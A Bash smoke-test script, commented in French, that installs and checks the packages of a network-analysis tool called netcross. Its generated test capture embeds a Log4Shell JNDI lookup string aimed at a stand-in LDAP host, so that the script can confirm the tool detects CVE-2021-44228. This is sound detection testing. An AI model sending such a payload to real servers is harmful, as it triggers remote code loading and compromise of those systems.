#!/usr/bin/env bash
# scripts/smoke-test-packages.sh -- test de fumee des paquets installes (issue #342).
#
# La casse du .deb (#336 : sous-paquets et pcap_parser non installes) est
# passee inapercue parce qu'aucun job ne construisait PUIS installait le
# paquet. Ce script verifie le paquet tel que l'utilisateur le recoit :
#
#   deb  : ./scripts/smoke-test-packages.sh deb build-deb/dist/netcross_*.deb
#          installe le .deb via apt (dependances resolues), puis
#          1. chaque lanceur /usr/bin/netcross* existe et est executable ;
#          2. chaque lanceur CLI repond a --help ;
#          3. chaque module de /usr/share/netcross s'importe avec
#             /usr/bin/python3 (hors extras optionnels, voir OPTIONAL) ;
#          4. une vraie analyse multi-points sur une capture generee detecte
#             Log4Shell (tshark + parsing + detection + rendu JSON).
#   rpm  : ./scripts/smoke-test-packages.sh rpm build-rpm/dist/netcross-*.rpm
#          verifie le contenu du paquet (rpm -qlp) : paquets Python,
#          donnees et lanceurs attendus.
#
# Sortie non nulle au premier ecart.

set -euo pipefail

MODE="${1:?usage: $0 deb|rpm <paquet>}"
PKG="${2:?usage: $0 deb|rpm <paquet>}"

# Extras optionnels : declares en Suggests, absents d'une installation
# minimale. Leur import est donc exclu de l'etape 3.
OPTIONAL_RE='^(netcross_api|netcross_ai|netcross_gtk4)(\.|$)'
PACKAGES=(pcap_parser netcross_core netcross_report netcross_gtk4 netcross_api netcross_ai)
CLIS=(netcross netcross-diff netcross-history netcross-batch netcross-ai-models netcross-lua-doc)
LAUNCHERS=("${CLIS[@]}" netcross-gui)

fail() { echo "ECHEC : $*" >&2; exit 1; }

check_rpm() {
    local listing
    listing="$(rpm -qlp "$PKG")"
    for p in "${PACKAGES[@]}"; do
        grep -q "/usr/share/netcross/$p/__init__.py$" <<<"$listing" || fail "rpm : paquet $p absent"
    done
    grep -q "/usr/share/netcross/netcross_core/data/cve_signatures.json$" <<<"$listing" \
        || fail "rpm : cve_signatures.json absent"
    grep -q "/usr/share/netcross/netcross_core/data/cve_seed.json$" <<<"$listing" \
        || fail "rpm : cve_seed.json absent"
    grep -q "/usr/share/netcross/data/lua_api.json$" <<<"$listing" || fail "rpm : lua_api.json absent"
    grep -q "/usr/share/netcross/data/lua_dissectors.csv$" <<<"$listing" || fail "rpm : lua_dissectors.csv absent"
    for l in "${LAUNCHERS[@]}"; do
        grep -q "^/usr/bin/$l$" <<<"$listing" || fail "rpm : lanceur /usr/bin/$l absent"
    done
    rpm -qp --requires "$PKG" | grep -q "python3-loguru" || fail "rpm : python3-loguru non requis"
    echo "rpm : contenu conforme ($(wc -l <<<"$listing") fichiers)"
}

make_capture() {
    # Capture pcap minimale ecrite en Python pur (aucune dependance) :
    # une poignee de main TCP puis une requete HTTP portant une charge
    # Log4Shell, de 10.0.0.10 vers 203.0.113.80:80.
    /usr/bin/python3 - "$1" <<'PY'
import struct, sys

def csum(b):
    if len(b) % 2:
        b += b"\0"
    s = sum(struct.unpack(f"!{len(b)//2}H", b))
    s = (s >> 16) + (s & 0xFFFF)
    return ~(s + (s >> 16)) & 0xFFFF

def ip(a):
    return bytes(int(x) for x in a.split("."))

def frame(src, dst, sport, dport, seq, ack, flags, payload=b""):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 65535, 0, 0) + payload
    pseudo = ip(src) + ip(dst) + struct.pack("!BBH", 0, 6, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", csum(pseudo + tcp)) + tcp[18:]
    iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 1, 0, 64, 6, 0, ip(src), ip(dst))
    iph = iph[:10] + struct.pack("!H", csum(iph)) + iph[12:]
    eth = b"\x00\x11\x22\x33\x44\x55" + b"\x66\x77\x88\x99\xaa\xbb" + b"\x08\x00"
    return eth + iph + tcp

C, S = "10.0.0.10", "203.0.113.80"
req = (b"GET /?x=${jndi:ldap://198.51.100.9:1389/a} HTTP/1.1\r\nHost: app\r\n"
       b"User-Agent: ${jndi:ldap://198.51.100.9:1389/a}\r\n\r\n")
frames = [
    frame(C, S, 40000, 80, 1000, 0, 0x02),
    frame(S, C, 80, 40000, 5000, 1001, 0x12),
    frame(C, S, 40000, 80, 1001, 5001, 0x10),
    frame(C, S, 40000, 80, 1001, 5001, 0x18, req),
    frame(S, C, 80, 40000, 5001, 1001 + len(req), 0x10),
]
with open(sys.argv[1], "wb") as f:
    f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
    for n, fr in enumerate(frames):
        f.write(struct.pack("<IIII", 1_700_000_000, n * 1000, len(fr), len(fr)) + fr)
PY
}

check_deb() {
    export DEBIAN_FRONTEND=noninteractive
    ${SUDO:-sudo} apt-get install -y -qq "$(readlink -f "$PKG")" >/dev/null

    for l in "${LAUNCHERS[@]}"; do
        [ -x "/usr/bin/$l" ] || fail "lanceur /usr/bin/$l absent ou non executable"
        grep -q "/usr/bin/python3" "/usr/bin/$l" || fail "/usr/bin/$l n'utilise pas /usr/bin/python3"
    done
    echo "lanceurs : ${#LAUNCHERS[@]} presents"

    for c in "${CLIS[@]}"; do
        "/usr/bin/$c" --help >/dev/null || fail "$c --help"
    done
    echo "--help : ${#CLIS[@]} CLI repondent"

    /usr/bin/python3 - "$OPTIONAL_RE" <<'PY'
import importlib, pathlib, re, sys
root = pathlib.Path("/usr/share/netcross")
sys.path.insert(0, str(root))
optional = re.compile(sys.argv[1])
mods, errors = [], []
for py in sorted(root.rglob("*.py")):
    rel = py.relative_to(root).with_suffix("")
    name = ".".join(rel.parts[:-1] if rel.name == "__init__" else rel.parts)
    if optional.match(name):
        continue
    mods.append(name)
    try:
        importlib.import_module(name)
    except Exception as exc:  # noqa: BLE001 -- on veut tout lister
        errors.append(f"{name}: {exc!r}")
if errors:
    print("\n".join(errors), file=sys.stderr)
    sys.exit(f"imports : {len(errors)} module(s) en echec sur {len(mods)}")
print(f"imports : {len(mods)} modules OK")
PY
    [ -f /usr/share/netcross/netcross_core/data/cve_signatures.json ] || fail "cve_signatures.json absent"
    [ -f /usr/share/netcross/netcross_core/data/cve_seed.json ] || fail "cve_seed.json absent"
    HOME="$(mktemp -d)" /usr/bin/netcross-lua-doc --class Tvb | grep -q "tvb:range" \
        || fail "netcross-lua-doc --class Tvb depuis le paquet installe"
    echo "netcross-lua-doc : fiche Tvb servie depuis /usr/share/netcross/data/lua_api.json"
    HOME="$(mktemp -d)" /usr/bin/netcross-lua-doc --dissectors mavlink | grep -q "dissecteur(s) Lua" \
        || fail "netcross-lua-doc --dissectors depuis le paquet installe"
    echo "netcross-lua-doc : catalogue des dissecteurs servi depuis /usr/share/netcross/data/lua_dissectors.csv"

    local tmp
    tmp="$(mktemp -d)"
    make_capture "$tmp/lan.pcap"
    cp "$tmp/lan.pcap" "$tmp/dc.pcap"
    ( cd "$tmp" && /usr/bin/netcross --capture "LAN=$tmp/lan.pcap" --capture "DC=$tmp/dc.pcap" \
        --security-report --json-report "$tmp/report.json" >"$tmp/out.txt" ) \
        || { cat "$tmp/out.txt" >&2; fail "analyse de bout en bout"; }
    grep -q "CVE-2021-44228" "$tmp/report.json" || fail "Log4Shell non detecte depuis le paquet installe"
    echo "analyse de bout en bout : Log4Shell detecte"
    rm -rf "$tmp"
}

case "$MODE" in
    deb) check_deb ;;
    rpm) check_rpm ;;
    *) fail "mode inconnu : $MODE" ;;
esac
echo "test de fumee $MODE : OK"
